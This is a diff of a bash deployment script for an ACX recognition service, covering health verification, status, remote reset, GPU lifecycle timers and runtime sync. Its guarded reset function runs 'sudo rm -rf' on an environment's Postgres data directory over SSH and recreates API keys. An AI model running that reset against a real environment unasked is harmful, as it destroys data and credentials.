+    receipt_path="$(env_to_remote_dir "$env")/deployed-release.json"
+    if receipt_output="$(read_deployed_release_receipt "$env")"; then
+      expected_sha="${receipt_output%%$'\n'*}"
+      receipt_digest_ref="${receipt_output#*$'\n'}"
+      log "Expected release from VM receipt: ${expected_sha:0:8} ${receipt_digest_ref}"
+    else
+      warn "VERIFY: no valid release receipt at ${receipt_path} on ${env}; deploy with current tooling first (standalone verify fails closed)"
+      emit_verify_ready_diagnostic "$ready_url"
+      return 1
+    fi
+  fi
+
+  # Bounded retry so post-restart warm-up (typically <30s) does not flap
+  # verification, while a genuinely missing/skewed SHA still fails closed.
+  if ! budget="$(probe_budget ACX_VERIFY 5 5)"; then
+    max_attempts="${ACX_VERIFY_ATTEMPTS:-5}"
+    sleep_s="${ACX_VERIFY_SLEEP:-5}"
+    if ! [[ "${max_attempts}" =~ ^[1-9][0-9]*$ ]]; then
+      fail "ACX_VERIFY_ATTEMPTS must be a positive integer (got: ${max_attempts})"
+    fi
+    fail "ACX_VERIFY_SLEEP must be a non-negative integer (got: ${sleep_s})"
+  fi
+  read -r max_attempts sleep_s <<<"${budget}"
+  log "Post-deploy public verify budget: ${max_attempts}x${sleep_s}s (ACX_VERIFY_*)"
+
+  for attempt in $(seq 1 "$max_attempts"); do
+    if [[ -n "${ACX_DEPLOY_LEASE_ENV:-}" && "${ACX_DEPLOY_LEASE_ENV}" == "${env}" ]]; then
+      if ! deploy_env_lease renew "${env}"; then
+        warn "deploy lease for ${env} lost before verification attempt ${attempt}; stopping verification"
+        return 1
+      fi
+    fi
+    log "GET ${url} (attempt ${attempt}/${max_attempts})"
+    health_response=""
+    curl_rc=0
+    health_response="$(curl --silent --show-error --max-time 10 --write-out $'\n%{http_code}' "$url" 2>&1)" || curl_rc=$?
+    http_code="${health_response##*$'\n'}"
+    body="${health_response%$'\n'*}"
+    if ((curl_rc != 0)) || [[ "${http_code}" == "000" || -z "${body}" ]]; then
+      warn "Health check fetch failed"
+      if ! printf '%s\n' "${body:-no health response}" | sanitize_deploy_diagnostic >&2; then
+        echo "diagnostic: health body unavailable" >&2
+      fi
+      verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
+      continue
+    fi
+    if ! printf '%s\n' "$body" | sanitize_deploy_diagnostic; then
+      echo "diagnostic: health body unavailable"
+    fi
+    # GR-261: commit_sha is present on unhealthy 503 bodies; identity match
+    # must not verify. Gate on 2xx, then SHA. /ready stays non-gating.
+    if [[ ! "${http_code}" =~ ^2[0-9][0-9]$ ]]; then
+      if [[ "${http_code}" == "503" ]]; then
+        warn "UNHEALTHY: ${env} /health reports unhealthy (database) (HTTP 503)"
+      else
+        warn "UNHEALTHY: ${env} /health HTTP ${http_code}"
+      fi
+      verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
+      continue
+    fi
+
+    # /health surfaces commit SHA for E15-3a-BR-03 deploy-lag detection.
+    actual_sha="$(printf '%s' "$body" | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d.get("commit_sha") or d.get("git_commit_sha") or d.get("version") or "")' 2>/dev/null || true)"
+
+    if [[ -z "$actual_sha" || "$actual_sha" == "unknown" ]]; then
+      warn "Service did not report a commit SHA (attempt ${attempt}/${max_attempts}). Image may have been built without --build-arg GIT_COMMIT_SHA."
+      verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
+      continue
+    fi
+
+    if [[ "${actual_sha:0:8}" == "${expected_sha:0:8}" ]]; then
+      # HARM-A-04: commit_sha alone cannot distinguish recognition vs VLM images
+      # that share a GIT_REF. Parse image_variant from /health (build-immutable
+      # signal) and compare to expected (local resolve, or remote repo name for
+      # bare standalone verify).
+      actual_variant="$(printf '%s' "$body" | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d.get("image_variant") or "")' 2>/dev/null || true)"
+      if [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" == "1" ||
+        -n "${ACX_BUILD_TARGET:-}" ||
+        -n "${ACX_IMAGE_VARIANT:-}" ]]; then
+        expected_variant="$(expected_image_variant)"
+      else
+        # Bare verify: derive expectation from sticky remote repo when present.
+        remote_repo_rc=0
+        remote_for_variant="$(read_remote_image_repo "$env")" || remote_repo_rc=$?
+        if ((remote_repo_rc != 0)); then
+          warn "VARIANT VERIFY: remote ACX_IMAGE_REPO state is unknown (read exit ${remote_repo_rc})"
+          emit_verify_ready_diagnostic "$ready_url"
+          return 1
+        fi
+        if [[ "${remote_for_variant}" == "__INVALID_REPO__" ]]; then
+          warn "VARIANT VERIFY: remote ACX_IMAGE_REPO failed charset validation"
+          emit_verify_ready_diagnostic "$ready_url"
+          return 1
+        fi
+        if [[ -n "${remote_for_variant}" ]]; then
+          expected_variant="$(variant_from_image_repo "${remote_for_variant}")"
+        else
+          expected_variant="$(expected_image_variant)"
+        fi
+      fi
+      if [[ -n "${actual_variant}" && "${actual_variant}" != "${expected_variant}" ]]; then
+        warn "VARIANT MISMATCH: ${env} /health image_variant='${actual_variant}', expected '${expected_variant}' (recognition vs VLM share commit_sha — this is the build-immutable signal)"
+        if ((attempt < max_attempts)); then
+          verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
+          continue
+        fi
+        emit_verify_ready_diagnostic "$ready_url"
+        return 1
+      fi
+      # Also compare the running container image (read from runtime — rg-015)
+      # against expected repo. Must return (not fail/exit) so ACX_VERIFY_OPTIONAL works.
+      image_mismatch=0
+      if ! verify_running_image_matches_deployed "$env"; then
+        image_mismatch=1
+      elif [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" != "1" ]] &&
+        ! verify_running_image_digest "$env" "${receipt_digest_ref}"; then
+        image_mismatch=1
+      fi
+      if ((image_mismatch)); then
+        # Image mismatch is not a warm-up flake — still retry once more in case
+        # compose is mid-pull, but do not call fail() here.
+        if ((attempt < max_attempts)); then
+          warn "Image mismatch on attempt ${attempt}/${max_attempts}; retrying with jittered backoff"
+          verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
+          continue
+        fi
+        emit_verify_ready_diagnostic "$ready_url"
+        return 1
+      fi
+      if ! gpu_budget="$(probe_budget ACX_GPU_SNAPSHOT_GATE 3 5)"; then
+        emit_verify_ready_diagnostic "$ready_url"
+        return 1
+      fi
+      read -r gpu_max_attempts gpu_sleep_s <<<"${gpu_budget}"
+      log "GPU snapshot gate budget: ${gpu_max_attempts}x${gpu_sleep_s}s (ACX_GPU_SNAPSHOT_GATE_*)"
+      gpu_pass=0
+      for gpu_attempt in $(seq 1 "${gpu_max_attempts}"); do
+        if verify_live_gpu_snapshots "$env"; then
+          gpu_pass=1
+          break
+        fi
+        warn "GPU snapshot verification failed on ${env} (attempt ${gpu_attempt}/${gpu_max_attempts})"
+        verify_retry_sleep "${gpu_attempt}" "${gpu_max_attempts}" "${gpu_sleep_s}"
+      done
+      if ((! gpu_pass)); then
+        emit_verify_ready_diagnostic "$ready_url"
+        return 1
+      fi
+      if [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" == "1" ]]; then
+        log "Verified: ${env} runs ${actual_sha:0:8} (matches DEPLOY_SHA=${DEPLOY_SHA} (GIT_REF=${GIT_REF})${actual_variant:+, image_variant=${actual_variant}})"
+      else
+        log "Verified: ${env} runs ${actual_sha:0:8} (matches VM release receipt${actual_variant:+, image_variant=${actual_variant}})"
+      fi
+      return 0
+    else
+      if [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" == "1" ]]; then
+        if [[ ! "${ACX_CANDIDATE_DIGEST_REF:-}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+          warn "VERIFY IDENTITY UNKNOWN: ${env} has no valid smoke-fenced candidate digest; retrying SHA mismatch observation"
+          verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
+          continue
+        fi
+        running_image_rc=0
+        candidate_image_rc=0
+        running_image_id="$(read_running_api_image_id "$env")" || running_image_rc=$?
+        candidate_image_id="$(remote_image_id_for_digest "$ACX_CANDIDATE_DIGEST_REF")" || candidate_image_rc=$?
+        if ((running_image_rc != 0 || candidate_image_rc != 0)) ||
+          [[ ! "${running_image_id}" =~ ^sha256:[a-f0-9]{64}$ ]] ||
+          [[ ! "${candidate_image_id}" =~ ^sha256:[a-f0-9]{64}$ ]]; then
+          warn "VERIFY IDENTITY UNKNOWN: ${env} could not resolve readable running/candidate image IDs (running=${running_image_id:-unknown}, candidate=${candidate_image_id:-unknown}); retrying SHA mismatch observation"
+          verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
+          continue
+        fi
+        if [[ "${running_image_id}" == "${candidate_image_id}" ]]; then
+          warn "VERIFY EXPECTATION ERROR: ${env} serves the smoke-fenced candidate ${ACX_CANDIDATE_DIGEST_REF} (HTTP ${http_code}) reporting ${actual_sha:0:8}, expected DEPLOY_SHA ${expected_sha:0:8}; not rolling back a healthy candidate"
+          emit_verify_ready_diagnostic "$ready_url"
+          return 2
+        fi
+        warn "ARTIFACT MISMATCH: ${env} /health reports ${actual_sha:0:8} (expected ${expected_sha:0:8}) but running image ID ${running_image_id} differs from smoke-fenced candidate image ID ${candidate_image_id} (${ACX_CANDIDATE_DIGEST_REF})"
+        emit_verify_ready_diagnostic "$ready_url"
+        return 1
+      fi
+      warn "SKEW: ${env} runs ${actual_sha:0:8}, expected ${expected_sha:0:8} (terminal: a running image cannot change its baked SHA by waiting)"
+      emit_verify_ready_diagnostic "$ready_url"
+      return 1
+    fi
+  done
+
+  # /ready is diagnostic only: unlike reset, deploy verification keeps its
+  # /health + identity/image pass/fail contract. Probe once on the terminal
+  # failing attempt so a DB/model failure is visible before rollback.
+  emit_verify_ready_diagnostic "$ready_url"
+  warn "SKEW: ${env} did not converge to ${expected_sha:0:8} after ${max_attempts} attempts."
+  return 1
+}
+
+#---------------------------------------------------------------- status
+do_status() {
+  local env url body sha http_code curl_rc health_response health_status
+  for env in dev dev-fir staging prod dev-auraface staging-auraface prod-auraface; do
+    url="$(env_to_health_url "$env")"
+    health_response=""
+    curl_rc=0
+    health_response="$(curl -sS --max-time 5 --write-out $'\n%{http_code}' "$url" 2>/dev/null)" || curl_rc=$?
+    http_code="${health_response##*$'\n'}"
+    body="${health_response%$'\n'*}"
+    if ((curl_rc != 0)) || [[ "${http_code}" == "000" || -z "${body}" ]]; then
+      printf '%-8s %s   %s\n' "$env" "unreachable" "$url"
+      continue
+    fi
+    sha="$(printf '%s' "$body" | python3 -c 'import json,sys;d=json.load(sys.stdin);print((d.get("commit_sha") or d.get("git_commit_sha") or "?")[:8])' 2>/dev/null || echo '?')"
+    health_status="$(printf '%s' "$body" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("status") or "")' 2>/dev/null || true)"
+    case "${health_status}" in
+      ok | unhealthy) ;;
+      *) health_status="unreachable" ;;
+    esac
+    printf '%-8s %s   %-10s %s\n' "$env" "$sha" "$health_status" "$url"
+  done
+}
+
+#---------------------------------------------------------------- reset
+# Destructive remote reset for an OCI environment. The dry-run reports the
+# validated reset plan; the live path stops the unit, clears only its PGDATA,
+# restarts it, recreates the service-mode key, and verifies /ready.
+do_reset() {
+  local env="$1"
+  local unit remote_dir ready_url
+
+  # env validation: reuse the existing case-based guards. They `fail` on unknown.
+  unit="$(env_to_unit "$env")" || return 1
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  ready_url="$(env_to_ready_url "$env")" || return 1
+
+  if [[ "${CONFIRM_REMOTE_RESET:-}" != "RESET" ]]; then
+    fail "Remote reset requires CONFIRM_REMOTE_RESET=RESET. Re-run: CONFIRM_REMOTE_RESET=RESET $0 reset $env"
+  fi
+  if is_prod_tier_env "$env" && [[ "${CONFIRM:-}" != "PROMOTE" ]]; then
+    fail "Production remote reset additionally requires CONFIRM=PROMOTE. Re-run: CONFIRM=PROMOTE CONFIRM_REMOTE_RESET=RESET $0 reset prod"
+  fi
+
+  log "Reset plan for env=${env}: unit=${unit} remote_dir=${remote_dir} ready_url=${ready_url}"
+  log "SSH target: ${SSH_TARGET}"
+
+  # Canonical remote command sequence. ACX_PGDATA_PATH is sourced from the env's
+  # .env so the reset boundary stays exactly the env-scoped Postgres data root —
+  # no other env's data is touched. `docker compose down` releases the volume
+  # mount so the directory can be cleared atomically before restart.
+  local remote_cmd
+  printf -v remote_cmd '%s\n' \
+    "set -euo pipefail" \
+    "cd ${remote_dir}" \
+    "echo '==> Stopping unit ${unit}'" \
+    "sudo systemctl stop ${unit}" \
+    "echo '==> Bringing compose project down to release the postgres volume'" \
+    "sudo docker compose -f docker-compose.env.yml down --remove-orphans" \
+    "echo '==> Sourcing ACX_PGDATA_PATH from ${remote_dir}/.env'" \
+    "set -a" \
+    "source ${remote_dir}/.env" \
+    "set +a" \
+    "if [ -z \"\${ACX_PGDATA_PATH:-}\" ]; then echo 'ACX_PGDATA_PATH is empty after sourcing .env — refusing to wipe' >&2; exit 64; fi" \
+    "if [ \"\${ACX_PGDATA_PATH}\" = '/' ] || [ \"\${ACX_PGDATA_PATH}\" = '/opt' ] || [ \"\${ACX_PGDATA_PATH}\" = '/opt/acx-backend' ]; then echo \"Refusing to clear suspicious ACX_PGDATA_PATH=\${ACX_PGDATA_PATH}\" >&2; exit 65; fi" \
+    "echo \"==> Clearing \${ACX_PGDATA_PATH}\"" \
+    "sudo rm -rf -- \"\${ACX_PGDATA_PATH}\"" \
+    "sudo mkdir -p -- \"\${ACX_PGDATA_PATH}\"" \
+    "echo '==> Starting unit ${unit}'" \
+    "sudo systemctl start ${unit}"
+
+  # Post-reset bootstrap. Recreates one usable service-mode API key after the
+  # destructive reset wipes the credentials table.
+  #
+  # Contract notes (E15-12-BR-03):
+  #   - manage_api_keys.py requires --env to exactly match ACX_ENV for the
+  #     selected stack. The validated reset env is passed as a positional
+  #     argument into the single-quoted heredoc and used for both CLI calls.
+  #     The API container receives ACX_ENV from that stack's Compose config;
+  #     its postgres service host is valid for matched deployed stack labels.
+  #   - The CLI uses `--tenant <uuid>`, NOT `--tenant-id <string>`. Tenant
+  #     identifiers must be UUIDs.
+  #   - There is no `--name` flag.
+  #   - `create` requires the tenant row to already exist (FK constraint), so
+  #     we run `tenant create --tenant <uuid> --site-url <url>` first; the
+  #     CLI handles the create-or-update case idempotently.
+  #   - The OCI postgres is what just got wiped — bootstrap must run on the
+  #     remote VM via `docker compose exec api`, not locally.
+  # E15-12-BR-06: the plugin sends X-Tenant-ID = TenantIdentity::derive_from_site_url()
+  # on every authenticated recognition request, where site_url is the WordPress
+  # site URL — not the recognition API URL. The bootstrap MUST bind the new
+  # service-mode API key to that same per-site tenant UUID, otherwise the
+  # backend rejects the plugin's first authenticated request with HTTP 403
+  # 'tenant mismatch' and the operator is left thinking reset failed.
+  #
+  # Operator contract:
+  #   - ACX_RESET_SITE_URL is required and must be the WordPress site URL the
+  #     plugin will hit (e.g. http://localhost:10010 for a LocalWP site).
+  #     There is no safe default: the previous defaults were the recognition
+  #     API URLs, which are NOT what the plugin sends as its origin tenant.
+  #   - ACX_RESET_TENANT_ID is optional. When unset, the bootstrap derives the
+  #     UUID from ACX_RESET_SITE_URL via scripts/deploy/_derive_tenant_id.py
+  #     (the Python mirror of TenantIdentity::derive_from_site_url()). When
+  #     set, the explicit value wins — escape hatch for non-derived tenants.
+  if [[ -z "${ACX_RESET_SITE_URL:-}" ]]; then
+    fail "ACX_RESET_SITE_URL must be set to the WordPress site URL the plugin will hit (e.g. http://localhost:10010 for LocalWP, or https://staging.altcontext.com). The bootstrap derives the per-site tenant UUID from this value to match the plugin's TenantIdentity::derive_from_site_url() (E15-12-BR-06). Set ACX_RESET_TENANT_ID as well only if you need to override derivation for a custom tenant."
+  fi
+  local site_url="${ACX_RESET_SITE_URL}"
+  # D1/S2-A-02: validate BEFORE any ssh/bootstrap interpolation — these reach remote root via sudo.
+  assert_safe_reset_site_url "${site_url}"
+  local tenant_id
+  if [[ -n "${ACX_RESET_TENANT_ID:-}" ]]; then
+    tenant_id="${ACX_RESET_TENANT_ID}"
+  else
+    tenant_id="$(python3 "${SCRIPT_DIR}/_derive_tenant_id.py" "${site_url}")"
+  fi
+  assert_safe_shell_token "ACX_RESET_TENANT_ID" "${tenant_id}"
+
+  # E15-12-BR-05: each `docker compose exec -T` reads from the remote script's stdin.
+  # Without `< /dev/null` on each exec, the first call swallows remaining lines and the
+  # second call never runs. Env, tenant, and site values are positional args to `bash -s`
+  # (quoted heredoc) — never interpolated into the remote command string (S2-A-02).
+  # Audit text for dry-run / operator review. The LIVE path never interpolates these into a
+  # remote shell string — it passes them as bash -s positional args (see ssh below).
+  local bootstrap_summary
+  printf -v bootstrap_summary '%s\n' \
+    "bash -s -- ${remote_dir} ${env} ${tenant_id} ${site_url}" \
+    "  # remote body (quoted heredoc; env=${env}): \$1=remote_dir \$2=env \$3=tenant_id \$4=site_url" \
+    "  cd \"\$1\"" \
+    "  sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env ${env} tenant create --tenant ${tenant_id} --site-url ${site_url} < /dev/null" \
+    "  sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env ${env} create --tenant ${tenant_id} < /dev/null"
+
+  # /ready verification: distinct from /health because reset specifically needs
+  # dependency readiness (postgres up, schema migrated, models loaded) before
+  # we declare the env operable. Array form — no shell-eval of the verify command (S2-A-02).
+  local -a verify_cmd=(curl -fsS --max-time 30 "${ready_url}")
+
+  if [[ "${ACX_RESET_DRY_RUN:-0}" == "1" ]]; then
+    log "DRY-RUN: would invoke ssh ${SSH_TARGET} with the following remote command:"
+    printf '%s\n' "${remote_cmd}"
+    log "DRY-RUN: would then verify readiness:"
+    printf '%s\n' "${verify_cmd[*]}"
+    log "DRY-RUN: would then run post-reset bootstrap on ${SSH_TARGET}:"
+    printf '%s\n' "${bootstrap_summary}"
+    log "DRY-RUN: no SSH session opened; no remote state mutated"
+    return 0
+  fi
+
+  preflight_ssh
+  install_deploy_interrupt_traps
+  deploy_env_lease acquire "$env" || fail "deploy lease for ${env} unavailable; holder line: ${ACX_DEPLOY_LEASE_LAST_HOLDER:-unknown}; refusing reset"
+  # Face-pipeline weights must exist before reset restarts the runtime (C-02).
+  preflight_remote_face_pipeline_models "$env"
+  recognition_edge_begin "$env" || return $?
+  log "Executing reset on ${SSH_TARGET}"
+  recognition_edge_command "$remote_cmd" || return $?
+
+  log "Verifying readiness at ${ready_url}"
+  # Brief settle window: systemd start is async; the unit may need a few seconds
+  # before postgres + the API report ready. The bootstrap must wait for /ready
+  # because `docker compose exec api` requires the api container to be up.
+  local attempts=0
+  until "${verify_cmd[@]}"; do
+    attempts=$((attempts + 1))
+    if ((attempts >= 6)); then
+      fail "Readiness check failed after ${attempts} attempts at ${ready_url}"
+    fi
+    log "Readiness not yet reported (attempt ${attempts}/6); retrying in 5s"
+    sleep 5
+  done
+
+  log "Running post-reset bootstrap on ${SSH_TARGET} (tenant create + key create)"
+  # Positional args — quoted heredoc body never expands local shell values into the
+  # remote command string. env / tenant_id / site_url reach remote only as argv after --.
+  # Unquoted multi-word form: OpenSSH joins destination args into the remote command, so
+  # remote argv is: bash -s -- <remote_dir> <env> <tenant_id> <site_url>. The env label
+  # was validated by env_to_unit above; tenant_id and site_url were charset-validated above.
+  local bootstrap_body
+  bootstrap_body="$(
+    cat <<'BOOTSTRAP'
+set -euo pipefail
+remote_dir="$1"
+env="$2"
+tenant_id="$3"
+site_url="$4"
+cd "${remote_dir}"
+echo "==> Ensuring tenant row exists for service-mode key bootstrap"
+sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env "${env}" tenant create --tenant "${tenant_id}" --site-url "${site_url}" < /dev/null
+echo "==> Creating post-reset service-mode API key (operator: copy api_key= line into the plugin)"
+sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env "${env}" create --tenant "${tenant_id}" < /dev/null
+BOOTSTRAP
+  )" || return $?
+  recognition_edge_command "bootstrap_reset() { $bootstrap_body; }; bootstrap_reset $(remote_quote "$remote_dir") $(remote_quote "$env") $(remote_quote "$tenant_id") $(remote_quote "$site_url")" || return $?
+  recognition_edge_finish || return $?
+
+  deploy_env_lease release "$env" || fail "deploy lease for ${env} could not be released after reset"
+  log "Reset complete. ${ready_url} returned ready and a fresh service-mode API key was printed above."
+}
+
+#------------------------------------------------------- GPU lifecycle timers
+# RLSE-11: the deploy pipeline owns this repeatable host convergence step. The
+# explicit flag keeps ordinary recognition deploys from changing GPU policy.
+do_gpu_lifecycle() {
+  local enabled="${ACX_DEPLOY_GPU_LIFECYCLE:-0}"
+  local dry_run="${ACX_GPU_LIFECYCLE_DRY_RUN:-0}"
+  local -a install_cmd
+
+  case "${enabled}" in
+    0)
+      printf 'error: GPU lifecycle timer installation disabled; nothing done (set ACX_DEPLOY_GPU_LIFECYCLE=1 to enable)\n' >&2
+      return 2
+      ;;
+    1) ;;
+    *) fail "ACX_DEPLOY_GPU_LIFECYCLE must be 0 or 1 (got: ${enabled})" ;;
+  esac
+
+  # Release It! 5.5 / rg-008: reject an incomplete enabled configuration
+  # before the installer can stage anything on the host.
+  [[ -n "${ACX_GPU_READY_URL:-}" ]] ||
+    fail "ACX_GPU_READY_URL is required when ACX_DEPLOY_GPU_LIFECYCLE=1"
+  if [[ ! "${GPU_INSTANCE_ID:-}" =~ ^ocid1\.instance\.oc1\.[a-z0-9-]+\.[a-z0-9]+$ ]]; then
+    printf 'error: ACX_GPU_INSTANCE_ID must match ocid1.instance.oc1.<region>.<identifier>.\n' >&2
+    return 2
+  fi
+  case "${dry_run}" in
+    0 | 1) ;;
+    *) fail "ACX_GPU_LIFECYCLE_DRY_RUN must be 0 or 1 (got: ${dry_run})" ;;
+  esac
+
+  # OCI_USER / OCI_HOST already passed assert_safe_ssh_identity at load time.
+  # Keep them as separate argv values; the installer preserves ssh's
+  # `-l USER -- HOST` boundary rather than rebuilding USER@HOST.
+  install_cmd=(
+    "${SCRIPT_DIR}/gpu-lifecycle-install.sh"
+    --user "${OCI_USER}"
+    --host "${OCI_HOST}"
+    --instance-id "${GPU_INSTANCE_ID}"
+    --ready-url "${ACX_GPU_READY_URL}"
+  )
+  if [[ "${dry_run}" == "1" ]]; then
+    install_cmd+=(--dry-run)
+    printf 'DRY-RUN:'
+    printf ' %q' "${install_cmd[@]}"
+    printf '\n'
+  else
+    log "Installing and verifying GPU lifecycle timers on ${SSH_TARGET}."
+  fi
+  "${install_cmd[@]}"
+}
+
+do_prepare_producer() {
+  local env="${1:-}"
+  [[ -n "${env}" ]] || fail "prepare-producer requires <env> (dev|dev-fir|staging|prod)"
+  env_to_unit "${env}" >/dev/null
+  # Explicit scoped completion on the shared ship; not an env latch and not a
+  # public do_deploy argument.
+  _ship_selected_env "${env}" scoped
+  log "Scoped producer-preparation for ${env}: image, effective describe-load writer, schema, freshness"
+  if ! verify_running_image_matches_deployed "${env}"; then
+    handle_failed_verification "${env}" "Scoped producer-preparation"
+  fi
+  if ! verify_scoped_producer_snapshots "${env}"; then
+    handle_failed_verification "${env}" "Scoped producer-preparation"
+  fi
+  recognition_edge_finish || fail "Scoped producer-preparation edge completion failed; journal retained"
+  log "Scoped producer-preparation passed for ${env}"
+}
+
+# A topology sync must retain the deployed image/source binding. It neither
+# builds a replacement nor applies an unverified mutable environment tag.
+do_sync_runtime() {
+  local env="$1" receipt sha digest observed
+  env_to_unit "$env" >/dev/null || return 1
+  if is_prod_tier_env "$env" && [[ "${CONFIRM:-}" != PROMOTE ]]; then
+    fail "Production runtime sync requires CONFIRM=PROMOTE"
+  fi
+  pin_deploy_sha
+  receipt="$(read_deployed_release_receipt "$env")" || fail "Runtime sync requires a valid deployed release receipt; use deploy ${env} for first installation"
+  sha="${receipt%%$'\n'*}"
+  digest="${receipt#*$'\n'}"
+  [[ "$sha" == "$DEPLOY_SHA" ]] || fail "Runtime sync GIT_REF must match deployed receipt source ${sha}"
+  recognition_edge_begin "$env" || fail "Runtime sync shared edge ownership unavailable"
+  preflight_ssh
+  preflight_remote_face_pipeline_models "$env"
+  preflight_env_manifest "$env"
+  preflight_remote_ocir_auth
+  deploy_env_lease acquire "$env" || fail "Runtime sync lease unavailable for ${env}"
+  observed="$(remote_image_commit_sha "$digest")" || fail "Runtime sync cannot verify immutable image source"
+  [[ "$observed" == "$sha" ]] || fail "Runtime sync image source differs from receipt"
+  verify_running_image_digest "$env" "$digest" || fail "Runtime sync running image differs from receipt"
+  preserve_rollback_tag "$env"
+  capture_prior_runtime_identity "$env" "${ACX_PRIOR_IMAGE_ID:-}" 0 || fail "Runtime sync cannot capture prior generation"
+  ACX_DEPLOY_ENV="$env"
+  ACX_CANDIDATE_DIGEST_REF="$digest"
+  ACX_IMAGE_REPO="${digest%@sha256:*}"
+  IMAGE_BASE="$ACX_IMAGE_REPO"
+  promote_gate "$env" "$digest" || fail "Runtime sync admission failed"
+  deploy_env_lease renew "$env" || fail "Runtime sync lease lost before restart"
+  if ! do_restart "$env" "$digest"; then
+    handle_failed_verification "$env" "Runtime sync restart"
+    return 1
+  fi
+  ACX_DEPLOY_PHASE=restarted
+  if ! do_verify "$env"; then
+    handle_failed_verification "$env" "Runtime sync"
+    return 1
+  fi
+  recognition_edge_finish || fail "Runtime sync edge completion failed; journal retained"
+  ACX_DEPLOY_PHASE=""
+}
+
+#---------------------------------------------------------------- dispatch
+# Skip dispatch when the script is sourced (e.g. by tests calling individual
+# functions), run it only on direct execution.
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
+  cmd="${1:-}"
+  shift || true
+  if [[ "$cmd" == "build" || "$cmd" == "build-remote" || "$cmd" == "deploy" ||
+    "$cmd" == "promote" || "$cmd" == "prepare-producer" || "$cmd" == "sync-runtime" || "$cmd" == "verify" ]]; then
+    pin_deploy_sha
+  fi
+  if [[ "$cmd" == "build" || "$cmd" == "build-remote" || "$cmd" == "deploy" ||
+    "$cmd" == "promote" || "$cmd" == "prepare-producer" || "$cmd" == "sync-runtime" ]]; then
+    materialize_deploy_snapshot "$cmd" "${1:-}"
+  fi
+  case "$cmd" in
+    build) do_build "${1:-dev}" ;;
+    build-remote) do_build_remote "${1:-dev}" ;;
+    sync-runtime)
+      [[ -n "${1:-}" ]] || fail "sync-runtime requires <env>"
+      do_sync_runtime "$1"
+      ;;
+    deploy)
+      [[ -n "${1:-}" ]] || fail "deploy requires <env>"
+      do_deploy "$@"
+      ;;
+    promote)
+      [[ -n "${1:-}" && -n "${2:-}" ]] || fail "promote requires <from-env> <to-env>"
+      do_promote "$1" "$2"
+      ;;
+    rollback)
+      [[ -n "${1:-}" && -n "${2:-}" ]] || fail "rollback requires <env> <rollback-id>"
+      do_rollback "$1" "$2"
+      ;;
+    reset)
+      [[ -n "${1:-}" ]] || fail "reset requires <env> (dev|dev-fir|staging|prod)"
+      do_reset "$1"
+      ;;
+    clear-image-repo)
+      [[ -n "${1:-}" ]] || fail "clear-image-repo requires <env> (dev|dev-fir|staging|prod)"
+      clear_remote_image_repo_env "$1"
+      ;;
+    gpu-lifecycle) do_gpu_lifecycle ;;
+    prepare-producer)
+      [[ -n "${1:-}" ]] || fail "prepare-producer requires <env> (dev|dev-fir|staging|prod)"
+      do_prepare_producer "$1"
+      ;;
+    verify) do_verify "${1:-dev}" ;;
+    status) do_status ;;
+    "" | -h | --help | help)
+      # Print the whole header comment block (line 2 until the first non-comment
+      # line) so ACX_EDGE_APPLY / reset docs stay visible as the header grows.
+      awk 'NR==1{next} /^#/{print; next} {exit}' "$0"
+      ;;
+    *) fail "Unknown command: ${cmd}. Run '$0 help'." ;;
+  esac
+fi
